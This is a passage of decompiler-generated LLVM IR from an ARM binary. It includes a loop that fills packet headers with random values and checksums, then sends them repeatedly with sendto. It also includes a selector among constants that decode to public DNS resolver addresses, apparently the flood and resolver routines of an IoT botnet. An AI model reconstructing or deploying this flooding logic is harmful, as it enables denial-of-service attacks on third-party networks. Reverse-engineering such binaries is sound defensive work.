  %v1_bc4c = phi i32 [ %v1_bc38.pre, %dec_label_pc_bc6c.dec_label_pc_bc2c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), %dec_label_pc_bc10 ]
  %v1_bc34 = phi i32 [ %v1_bd1c, %dec_label_pc_bc6c.dec_label_pc_bc2c_crit_edge ], [ 0, %dec_label_pc_bc10 ]
  store i32 %v4_b6b0, i32* %r3.global-to-local, align 4
  store i32 %v3_b96c, i32* %r8.global-to-local, align 4
  %v4_bc34 = mul i32 %v1_bc34, 4
  %v5_bc34 = add i32 %v4_bc34, %v4_b6b0
  %v6_bc34 = inttoptr i32 %v5_bc34 to i32*
  %v7_bc34 = load i32, i32* %v6_bc34, align 4
  store i32 %v7_bc34, i32* @r4, align 4
  %v9_bc38 = icmp eq i32 %v3_b96c, %v1_bc4c
  store i1 %v9_bc38, i1* %cpsr_z.global-to-local, align 1
  %v1_bc3c = add i32 %v7_bc34, 20
  store i32 %v1_bc3c, i32* @r5, align 4
  %v1_bc40 = add i32 %v7_bc34, 28
  store i32 %v1_bc40, i32* @r8, align 4
  br i1 %v9_bc38, label %dec_label_pc_bd40, label %dec_label_pc_bc48

dec_label_pc_bc48:                                ; preds = %dec_label_pc_bc2c
  store i32 %v3_b970, i32* %ip.global-to-local, align 4
  %v9_bc4c = icmp eq i32 %v3_b970, %v1_bc4c
  store i1 %v9_bc4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bc4c, label %dec_label_pc_bd5c, label %dec_label_pc_bc54

dec_label_pc_bc54:                                ; preds = %dec_label_pc_bd40.dec_label_pc_bc54_crit_edge, %dec_label_pc_bc48
  %v1_bc58 = phi i32 [ %v1_bc58.pre, %dec_label_pc_bd40.dec_label_pc_bc54_crit_edge ], [ %v1_bc4c, %dec_label_pc_bc48 ]
  store i32 %v3_b974, i32* %lr.global-to-local, align 4
  %v9_bc58 = icmp eq i32 %v3_b974, %v1_bc58
  store i1 %v9_bc58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bc58, label %dec_label_pc_bd78, label %dec_label_pc_bc60

dec_label_pc_bc60:                                ; preds = %dec_label_pc_bd5c.dec_label_pc_bc60_crit_edge, %dec_label_pc_bc54
  %v1_bc64 = phi i32 [ %v1_bc64.pre, %dec_label_pc_bd5c.dec_label_pc_bc60_crit_edge ], [ %v1_bc58, %dec_label_pc_bc54 ]
  store i32 %v3_b978, i32* %r0.global-to-local, align 4
  %v9_bc64 = icmp eq i32 %v3_b978, %v1_bc64
  store i1 %v9_bc64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bc64, label %dec_label_pc_bd94, label %dec_label_pc_bc6c

dec_label_pc_bc6c:                                ; preds = %dec_label_pc_bd78, %dec_label_pc_bc60, %dec_label_pc_bd94
  %v0_bc6c = load i32, i32* @r4, align 4
  %v1_bc6c = add i32 %v0_bc6c, 41
  store i32 %v1_bc6c, i32* %r0.global-to-local, align 4
  store i32 %v4_bc70.pre-phi, i32* %r1.global-to-local, align 4
  %v2_bc74 = call i32 @function_f730(i32 %v1_bc6c, i32 %v4_bc70.pre-phi)
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bc7c = load i32, i32* @r7, align 4
  %v1_bc7c = trunc i32 %v0_bc7c to i8
  %v2_bc7c = load i32, i32* @r4, align 4
  %v3_bc7c = add i32 %v2_bc7c, 10
  %v4_bc7c = inttoptr i32 %v3_bc7c to i8*
  store i8 %v1_bc7c, i8* %v4_bc7c, align 1
  %v0_bc80 = load i32, i32* @r7, align 4
  %v1_bc80 = trunc i32 %v0_bc80 to i8
  %v2_bc80 = load i32, i32* @r4, align 4
  %v3_bc80 = add i32 %v2_bc80, 11
  %v4_bc80 = inttoptr i32 %v3_bc80 to i8*
  store i8 %v1_bc80, i8* %v4_bc80, align 1
  %v0_bc84 = load i32, i32* @r4, align 4
  store i32 %v0_bc84, i32* @r0, align 4
  %v2_bc88 = call i32 @function_ddf4(i32 %v0_bc84, i32 20)
  %v3_bc88 = trunc i32 %v2_bc88 to i8
  store i32 %v2_bc88, i32* %r0.global-to-local, align 4
  %v4_bc8c = sdiv i32 %v2_bc88, 256
  store i32 %v4_bc8c, i32* %r3.global-to-local, align 4
  %v1_bc90 = trunc i32 %v4_bc8c to i8
  %v2_bc90 = load i32, i32* @r4, align 4
  %v3_bc90 = add i32 %v2_bc90, 11
  %v4_bc90 = inttoptr i32 %v3_bc90 to i8*
  store i8 %v1_bc90, i8* %v4_bc90, align 1
  %v3_bc94 = load i32, i32* @r4, align 4
  %v4_bc94 = add i32 %v3_bc94, 10
  %v5_bc94 = inttoptr i32 %v4_bc94 to i8*
  store i8 %v3_bc88, i8* %v5_bc94, align 1
  %v0_bc98 = load i32, i32* @r7, align 4
  %v1_bc98 = trunc i32 %v0_bc98 to i8
  %v2_bc98 = load i32, i32* @r5, align 4
  %v3_bc98 = add i32 %v2_bc98, 6
  %v4_bc98 = inttoptr i32 %v3_bc98 to i8*
  store i8 %v1_bc98, i8* %v4_bc98, align 1
  %v0_bc9c = load i32, i32* @r7, align 4
  %v1_bc9c = trunc i32 %v0_bc9c to i8
  %v2_bc9c = load i32, i32* @r5, align 4
  %v3_bc9c = add i32 %v2_bc9c, 7
  %v4_bc9c = inttoptr i32 %v3_bc9c to i8*
  store i8 %v1_bc9c, i8* %v4_bc9c, align 1
  %v0_bca0 = load i32, i32* @r4, align 4
  %v1_bca0 = add i32 %v0_bca0, 24
  %v2_bca0 = inttoptr i32 %v1_bca0 to i8*
  %v3_bca0 = load i8, i8* %v2_bca0, align 1
  %v4_bca0 = zext i8 %v3_bca0 to i32
  store i32 %v4_bca0, i32* %r3.global-to-local, align 4
  %v1_bca4 = add i32 %v0_bca0, 25
  %v2_bca4 = inttoptr i32 %v1_bca4 to i8*
  %v3_bca4 = load i8, i8* %v2_bca4, align 1
  %v4_bca4 = zext i8 %v3_bca4 to i32
  %v0_bca8 = load i32, i32* @r5, align 4
  store i32 %v0_bca8, i32* @r1, align 4
  %v4_bcac = mul nuw nsw i32 %v4_bca4, 256
  %v5_bcac = or i32 %v4_bcac, %v4_bca0
  store i32 %v5_bcac, i32* %r2.global-to-local, align 4
  store i32 %v0_bca0, i32* %r0.global-to-local, align 4
  %v0_bcb4 = load i32, i32* @sb, align 4
  store i32 %v0_bcb4, i32* %r3.global-to-local, align 4
  %v4_bcb8 = call i32 @function_de50(i32 %v0_bca0, i32 %v0_bca8, i32 %v5_bcac, i32 %v0_bcb4)
  %v5_bcb8 = trunc i32 %v4_bcb8 to i8
  store i32 %v4_bcb8, i32* %r0.global-to-local, align 4
  %v3_bcbc = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-2176.0, i32* %r2.global-to-local, align 4
  %v5_bccc = mul i32 %v3_bcbc, 24
  %v2_bcd0 = add i32 %v5_bccc, %arg2
  store i32 %v2_bcd0, i32* %lr.global-to-local, align 4
  %v4_bcd4 = sdiv i32 %v4_bcb8, 256
  store i32 %v4_bcd4, i32* %r3.global-to-local, align 4
  %v3_bcd8 = load i32, i32* @r5, align 4
  %v4_bcd8 = add i32 %v3_bcd8, 6
  %v5_bcd8 = inttoptr i32 %v4_bcd8 to i8*
  store i8 %v5_bcb8, i8* %v5_bcd8, align 1
  %v0_bcdc = load i32, i32* %r3.global-to-local, align 4
  %v1_bcdc = trunc i32 %v0_bcdc to i8
  %v2_bcdc = load i32, i32* @r5, align 4
  %v3_bcdc = add i32 %v2_bcdc, 7
  %v4_bcdc = inttoptr i32 %v3_bcdc to i8*
  store i8 %v1_bcdc, i8* %v4_bcdc, align 1
  %v0_bce0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bce0 = load i32, i32* %lr.global-to-local, align 4
  %v2_bce0 = add i32 %v1_bce0, 4
  %v3_bce0 = inttoptr i32 %v2_bce0 to i32*
  store i32 %v0_bce0, i32* %v3_bce0, align 4
  %v0_bce4 = load i32, i32* @r4, align 4
  %v1_bce4 = add i32 %v0_bce4, 20
  %v2_bce4 = inttoptr i32 %v1_bce4 to i32*
  %v3_bce4 = load i32, i32* %v2_bce4, align 4
  %v3_bce8 = udiv i32 %v3_bce4, 65536
  store i32 %v3_bce8, i32* %r3.global-to-local, align 4
  %v3_bcec13 = udiv i32 %v3_bce4, 16777216
  %v1_bcf0 = trunc i32 %v3_bcec13 to i8
  %v2_bcf0 = load i32, i32* %lr.global-to-local, align 4
  %v3_bcf0 = add i32 %v2_bcf0, 3
  %v4_bcf0 = inttoptr i32 %v3_bcf0 to i8*
  store i8 %v1_bcf0, i8* %v4_bcf0, align 1
  %v0_bcf4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bcf4 = trunc i32 %v0_bcf4 to i8
  %v2_bcf4 = load i32, i32* %lr.global-to-local, align 4
  %v3_bcf4 = add i32 %v2_bcf4, 2
  %v4_bcf4 = inttoptr i32 %v3_bcf4 to i8*
  store i8 %v1_bcf4, i8* %v4_bcf4, align 1
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_bd00 = load i32, i32* @r4, align 4
  store i32 %v0_bd00, i32* %r1.global-to-local, align 4
  store i32 %v3_b90c, i32* %r0.global-to-local, align 4
  %v0_bd08 = load i32, i32* @sl, align 4
  store i32 %v0_bd08, i32* %r2.global-to-local, align 4
  %v0_bd0c = load i32, i32* %lr.global-to-local, align 4
  %v4_bd0c = inttoptr i32 %v0_bd0c to %sockaddr*
  %v7_bd14 = inttoptr i32 %v0_bd00 to i32*
  %v9_bd14 = call i32 @sendto(i32 %v3_b90c, i32* %v7_bd14, i32 %v0_bd08, i32 16384, %sockaddr* %v4_bd0c, i32 16)
  %v3_bd18 = load i32, i32* %stack_var_-40, align 4
  %v1_bd1c = add i32 %v3_bd18, 1
  store i32 %v1_bd1c, i32* %r0.global-to-local, align 4
  store i32 %v1_b698, i32* %r3.global-to-local, align 4
  %v9_bd24 = icmp eq i32 %v1_b698, %v1_bd1c
  store i1 %v9_bd24, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bd1c, i32* %stack_var_-40, align 4
  %v8_bd2c = icmp sgt i32 %v1_b698, %v1_bd1c
  br i1 %v8_bd2c, label %dec_label_pc_bc6c.dec_label_pc_bc2c_crit_edge, label %dec_label_pc_bd30

dec_label_pc_bc6c.dec_label_pc_bc2c_crit_edge:    ; preds = %dec_label_pc_bc6c
  %v1_bc38.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_bc2c

dec_label_pc_bd30:                                ; preds = %dec_label_pc_bc6c
  store i32 %v1_b698, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_bc0c

dec_label_pc_bd40:                                ; preds = %dec_label_pc_bc2c
  %v0_bd40 = call i32 @function_f67c()
  %v1_bd40 = trunc i32 %v0_bd40 to i8
  store i32 %v0_bd40, i32* %r0.global-to-local, align 4
  store i32 %v3_b970, i32* %ip.global-to-local, align 4
  %v4_bd48 = sdiv i32 %v0_bd40, 256
  store i32 %v4_bd48, i32* %r3.global-to-local, align 4
  %v1_bd4c = load i32, i32* @r6, align 4
  %v9_bd4c = icmp eq i32 %v3_b970, %v1_bd4c
  store i1 %v9_bd4c, i1* %cpsr_z.global-to-local, align 1
  %v1_bd50 = trunc i32 %v4_bd48 to i8
  %v2_bd50 = load i32, i32* @r4, align 4
  %v3_bd50 = add i32 %v2_bd50, 5
  %v4_bd50 = inttoptr i32 %v3_bd50 to i8*
  store i8 %v1_bd50, i8* %v4_bd50, align 1
  %v3_bd54 = load i32, i32* @r4, align 4
  %v4_bd54 = add i32 %v3_bd54, 4
  %v5_bd54 = inttoptr i32 %v4_bd54 to i8*
  store i8 %v1_bd40, i8* %v5_bd54, align 1
  %v0_bd58 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bd58, label %dec_label_pc_bd5c, label %dec_label_pc_bd40.dec_label_pc_bc54_crit_edge

dec_label_pc_bd40.dec_label_pc_bc54_crit_edge:    ; preds = %dec_label_pc_bd40
  %v1_bc58.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_bc54

dec_label_pc_bd5c:                                ; preds = %dec_label_pc_bd40, %dec_label_pc_bc48
  %v0_bd5c = call i32 @function_f67c()
  %v1_bd5c = trunc i32 %v0_bd5c to i8
  store i32 %v0_bd5c, i32* %r0.global-to-local, align 4
  store i32 %v3_b974, i32* %lr.global-to-local, align 4
  %v4_bd64 = sdiv i32 %v0_bd5c, 256
  store i32 %v4_bd64, i32* %r3.global-to-local, align 4
  %v1_bd68 = load i32, i32* @r6, align 4
  %v9_bd68 = icmp eq i32 %v3_b974, %v1_bd68
  store i1 %v9_bd68, i1* %cpsr_z.global-to-local, align 1
  %v3_bd6c = load i32, i32* @r4, align 4
  %v4_bd6c = add i32 %v3_bd6c, 20
  %v5_bd6c = inttoptr i32 %v4_bd6c to i8*
  store i8 %v1_bd5c, i8* %v5_bd6c, align 1
  %v0_bd70 = load i32, i32* %r3.global-to-local, align 4
  %v1_bd70 = trunc i32 %v0_bd70 to i8
  %v2_bd70 = load i32, i32* @r5, align 4
  %v3_bd70 = add i32 %v2_bd70, 1
  %v4_bd70 = inttoptr i32 %v3_bd70 to i8*
  store i8 %v1_bd70, i8* %v4_bd70, align 1
  %v0_bd74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bd74, label %dec_label_pc_bd78, label %dec_label_pc_bd5c.dec_label_pc_bc60_crit_edge

dec_label_pc_bd5c.dec_label_pc_bc60_crit_edge:    ; preds = %dec_label_pc_bd5c
  %v1_bc64.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_bc60

dec_label_pc_bd78:                                ; preds = %dec_label_pc_bd5c, %dec_label_pc_bc54
  %v0_bd78 = call i32 @function_f67c()
  %v1_bd78 = trunc i32 %v0_bd78 to i8
  %v4_bd7c = sdiv i32 %v0_bd78, 256
  store i32 %v4_bd7c, i32* %r3.global-to-local, align 4
  %v3_bd80 = load i32, i32* @r5, align 4
  %v4_bd80 = add i32 %v3_bd80, 2
  %v5_bd80 = inttoptr i32 %v4_bd80 to i8*
  store i8 %v1_bd78, i8* %v5_bd80, align 1
  store i32 %v3_b978, i32* %r0.global-to-local, align 4
  %v1_bd88 = load i32, i32* @r6, align 4
  %v9_bd88 = icmp eq i32 %v3_b978, %v1_bd88
  store i1 %v9_bd88, i1* %cpsr_z.global-to-local, align 1
  %v0_bd8c = load i32, i32* %r3.global-to-local, align 4
  %v1_bd8c = trunc i32 %v0_bd8c to i8
  %v2_bd8c = load i32, i32* @r5, align 4
  %v3_bd8c = add i32 %v2_bd8c, 3
  %v4_bd8c = inttoptr i32 %v3_bd8c to i8*
  store i8 %v1_bd8c, i8* %v4_bd8c, align 1
  %v0_bd90 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bd90, label %dec_label_pc_bd94, label %dec_label_pc_bc6c

dec_label_pc_bd94:                                ; preds = %dec_label_pc_bd78, %dec_label_pc_bc60
  %v0_bd94 = call i32 @function_f67c()
  %v1_bd94 = trunc i32 %v0_bd94 to i8
  store i32 %v0_bd94, i32* %r0.global-to-local, align 4
  %v4_bd98 = sdiv i32 %v0_bd94, 256
  store i32 %v4_bd98, i32* %r3.global-to-local, align 4
  %v3_bd9c = load i32, i32* @r4, align 4
  %v4_bd9c = add i32 %v3_bd9c, 28
  %v5_bd9c = inttoptr i32 %v4_bd9c to i8*
  store i8 %v1_bd94, i8* %v5_bd9c, align 1
  %v0_bda0 = load i32, i32* %r3.global-to-local, align 4
  %v1_bda0 = trunc i32 %v0_bda0 to i8
  %v2_bda0 = load i32, i32* @r8, align 4
  %v3_bda0 = add i32 %v2_bda0, 1
  %v4_bda0 = inttoptr i32 %v3_bda0 to i8*
  store i8 %v1_bda0, i8* %v4_bda0, align 1
  br label %dec_label_pc_bc6c

dec_label_pc_bda8:                                ; preds = %dec_label_pc_b874, %dec_label_pc_b840, %dec_label_pc_b7e4, %dec_label_pc_b68c
  %v0_bda8 = call i32 @function_f67c()
  %v1_bdac = urem i32 %v0_bda8, 4
  store i32 %v1_bdac, i32* %r0.global-to-local, align 4
  %v2_bdb0 = icmp eq i32 %v1_bdac, 3
  store i1 %v2_bdb0, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_bda8 to i2
  switch i2 %trunc, label %dec_label_pc_b8e821 [
    i2 0, label %dec_label_pc_bdf0
    i2 1, label %dec_label_pc_be04
    i2 -2, label %dec_label_pc_be10
    i2 -1, label %dec_label_pc_be20
  ]

dec_label_pc_bdcc:                                ; preds = %dec_label_pc_b948
  store i32 %v2_b8f8, i32* %r0.global-to-local, align 4
  %v4_bdd0 = sext i8 %v5_b964 to i32
  store i32 %v4_bdd0, i32* %r1.global-to-local, align 4
  %v2_bdd4 = add i32 %v4_bdd0, %v2_b8f8
  store i32 %v2_bdd4, i32* @fp, align 4
  br label %dec_label_pc_bc00

dec_label_pc_bddc:                                ; preds = %dec_label_pc_b91c
  store i32 %v3_b90c, i32* %r0.global-to-local, align 4
  %v1_bde0 = call i32 @close(i32 %v3_b90c)
  store i32 %v1_bde0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bde4

dec_label_pc_bde4:                                ; preds = %dec_label_pc_b8f4, %dec_label_pc_b8e8, %dec_label_pc_bddc
  %v29_bdec = phi i32 [ -1, %dec_label_pc_b8f4 ], [ %v29_bdec75, %dec_label_pc_b8e8 ], [ %v1_bde0, %dec_label_pc_bddc ]
  store i32 %v3_b68c, i32* %r4.global-to-local, align 4
  store i32 %v6_b68c, i32* %r5.global-to-local, align 4
  store i32 %v9_b68c, i32* %r6.global-to-local, align 4
  store i32 %v12_b68c, i32* %r7.global-to-local, align 4
  store i32 %v15_b68c, i32* %r8.global-to-local, align 4
  store i32 %v18_b68c, i32* %sb.global-to-local, align 4
  store i32 %v21_b68c, i32* %sl.global-to-local, align 4
  store i32 %v24_b68c, i32* %fp.global-to-local, align 4
  ret i32 %v29_bdec

dec_label_pc_bdf0:                                ; preds = %dec_label_pc_bda8
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b8e8

dec_label_pc_be04:                                ; preds = %dec_label_pc_bda8
  store i32 707416650, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b8e8

dec_label_pc_be10:                                ; preds = %dec_label_pc_bda8
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_b8e8

dec_label_pc_be20:                                ; preds = %dec_label_pc_bda8
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b8e8

; uselistorder directives
  uselistorder i32 %v4_bdd0, { 0, 2, 1 }
  uselistorder i32 %v1_bdac, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_bda8, { 1, 0 }
  uselistorder i32 %v0_bd94, { 0, 2, 1 }
  uselistorder i32 %v0_bd5c, { 0, 2, 1 }
  uselistorder i32 %v4_bd48, { 1, 0 }
  uselistorder i32 %v0_bd40, { 0, 2, 1 }
  uselistorder i32 %v1_bd1c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_bcb8, { 0, 2, 1 }
  uselistorder i32 %v0_bca0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_bc8c, { 1, 0 }
  uselistorder i32 %v2_bc88, { 0, 2, 1 }
  uselistorder i32 %v7_bc34, { 1, 0, 2 }
  uselistorder i32 %v4_bc70.pre-phi, { 1, 0 }
  uselistorder i32 %v2_bbb4, { 1, 0 }
  uselistorder i32 %v1_bba887, { 1, 0, 2 }
  uselistorder i32 %v1_bb9c, { 2, 1, 0 }
  uselistorder i32 %v0_bb9c, { 1, 2, 0 }
  uselistorder i32 %v0_bb9c33, { 1, 0 }
  uselistorder i32 %v1_bb9c34, { 2, 0, 1 }
  uselistorder i8 %extract.t79, { 1, 0 }
  uselistorder i32 %v1_bb70, { 2, 0, 4, 1, 3, 5, 6 }
  uselistorder i32 %v0_baec, { 1, 0 }
  uselistorder i32 %v3_ba28, { 1, 0, 2 }
  uselistorder i32 %v1_b9f0, { 1, 0 }
  uselistorder i32 %v1_b9e4, { 1, 0 }
  uselistorder i32 %v1_b9c8, { 1, 0 }
  uselistorder i32 %v1_b9b4, { 1, 0 }
  uselistorder i32 %v3_b9ac, { 1, 0 }
  uselistorder i32 %v4_b9a4, { 0, 4, 2, 5, 3, 1 }
  uselistorder i8 %v5_b964, { 1, 0 }
  uselistorder i32 %v0_b960, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_b95c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_b954, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_b90c, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 %v2_b8f8, { 0, 11, 1, 6, 4, 3, 7, 10, 9, 8, 5, 2 }
  uselistorder i32 %stack_var_-2176.0, { 1, 0 }
  uselistorder i32 %v3_b8e0, { 1, 0, 2 }
  uselistorder i1 %v7_b8b0, { 1, 0 }
  uselistorder i32 %v1_b8ac, { 1, 0, 2 }
  uselistorder i1 %v8_b8a4, { 1, 0 }
  uselistorder i1 %v7_b8a0, { 1, 0 }
  uselistorder i32 %v1_b894, { 1, 0 }
  uselistorder i8 %v2_b888, { 2, 0, 1, 3 }
  uselistorder i32 %v0_b88c, { 1, 0 }
  uselistorder i32 %v0_b8ac, { 3, 0, 2, 1 }
  uselistorder i32 %v0_b878, { 0, 2, 1 }
  uselistorder i32 %v1_b890, { 0, 2, 1 }
  uselistorder i32 %v2_b860, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_b858, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b840, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v0_b838, { 1, 2, 0, 3, 5, 4, 6 }
  uselistorder i32 %v0_b7dc, { 1, 0, 3, 2 }
  uselistorder i32 %v5_b7ac, { 0, 3, 5, 4, 2, 1, 7, 6 }
  uselistorder i32 %v1_b730, { 1, 0 }
  uselistorder i32 %v7_b6ec, { 0, 1, 2, 4, 3 }
  uselistorder i8 %v5_b6e8, { 1, 0 }
  uselistorder i32 %v6_b6c8, { 1, 0 }
  uselistorder i32 %v4_b6b0, { 0, 3, 1, 2 }
  uselistorder i32 %v1_b698, { 7, 4, 5, 6, 3, 8, 9, 10, 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9 }
  uselistorder i32* %sl.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %sb.global-to-local, { 5, 0, 1, 4, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 5, 6, 0, 1, 4, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 6, 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 14, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 2, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 3, 4, 5, 6, 7, 8, 9, 10, 11, 1, 12, 13, 14, 15, 16, 17, 18, 28, 29, 30, 31, 32, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 37, 38, 39, 40, 41, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 29, 30, 31, 32, 33, 34, 35, 36, 21, 20, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 47, 48, 49, 51, 50, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 39, 40, 41, 42, 43, 44, 45, 46, 27, 28, 29, 31, 30, 33, 32, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 59, 56, 57, 58, 61, 60, 62, 64, 63, 65, 3, 66, 2, 67, 68, 69, 5, 6, 7, 1, 21, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 24, 22, 23, 38, 39, 41, 40, 42, 44, 43, 45, 47, 46, 49, 48, 50, 51, 53, 52, 54, 4, 55, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %lr.global-to-local, { 21, 25, 22, 23, 24, 26, 27, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %ip.global-to-local, { 20, 21, 22, 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 17, 18, 19, 14, 15, 16 }
  uselistorder i32* %fp.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 16, 17, 18, 15, 12, 19, 20, 21 }
  uselistorder i32 134744072, { 1, 0 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 33686020, { 1, 0 }
  uselistorder i8 46, { 1, 0 }
  uselistorder label %dec_label_pc_bde4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_bc6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_bc0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bc00, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_b8bc, { 1, 0 }
  uselistorder label %dec_label_pc_b8b0, { 1, 0 }
  uselistorder label %dec_label_pc_b874, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b86c, { 1, 0 }
}

define i32 @function_be3c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_be3c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp40 = call i8 @__decompiler_undefined_function_1()
  %tmp41 = call i8 @__decompiler_undefined_function_1()
  %tmp42 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_be3c = load i32, i32* @r4, align 4
  %v1_be40 = urem i32 %arg1, 256
  store i32 %v1_be40, i32* @fp, align 4
  store i32 %v1_be40, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_be58 = urem i32 %arg3, 256
  store i32 %v1_be58, i32* @r4, align 4
  %v2_be5c = call i32* @calloc(i32 %v1_be40, i32 16)
  %v4_be5c = ptrtoint i32* %v2_be5c to i32
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_be68 = load i32, i32* @fp, align 4
  store i32 %v0_be68, i32* %r0.global-to-local, align 4
  %v2_be6c = call i32* @calloc(i32 %v0_be68, i32 4)
  %v4_be6c = ptrtoint i32* %v2_be6c to i32
  %v0_be70 = load i32, i32* @r5, align 4
  store i32 %v0_be70, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be80 = load i32, i32* @r4, align 4
  store i32 %v0_be80, i32* %r0.global-to-local, align 4
  %v5_be84 = inttoptr i32 %v0_be70 to i32*
  %v6_be84 = call i32 @function_92dc(i32 %v0_be80, i32* %v5_be84, i32 2, i32 0)
  %v1_be90 = urem i32 %v6_be84, 256
  store i32 %v1_be90, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_be9c = load i32, i32* @r5, align 4
  store i32 %v0_be9c, i32* %r1.global-to-local, align 4
  %v0_bea0 = load i32, i32* @r4, align 4
  store i32 %v0_bea0, i32* %r0.global-to-local, align 4
  %v6_bea8 = inttoptr i32 %v0_be9c to i32*
  %v7_bea8 = call i32 @function_92dc(i32 %v0_bea0, i32* %v6_bea8, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_beac = load i32, i32* @r5, align 4
  store i32 %v0_beac, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bea8, i32* @r6, align 4
  %v0_bebc = load i32, i32* @r4, align 4
  store i32 %v0_bebc, i32* %r0.global-to-local, align 4
  %v4_bec0 = inttoptr i32 %v0_beac to i32*
